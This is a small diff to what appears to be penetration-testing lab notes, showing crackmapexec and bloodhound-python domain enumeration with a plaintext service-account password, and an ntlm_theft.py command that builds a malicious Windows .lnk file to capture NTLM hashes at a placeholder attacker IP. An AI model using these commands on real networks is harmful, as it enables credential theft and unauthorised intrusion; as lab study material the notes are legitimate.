@@ -135,10 +135,8 @@ cme ldap hokkaido-aerospace.com -u 'hrapp-service' -p 'Untimed$Runny' --bloodhou
 bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.208.40
 ```
 ---
-# steal ntml 
+# Create malicious Windows file
 ```bash
 python3 ntlm_theft.py -g lnk -s <ip> -f vault
 ```
----
-# Create malicious Windows file
 - https://github.com/Greenwolf/ntlm_theft
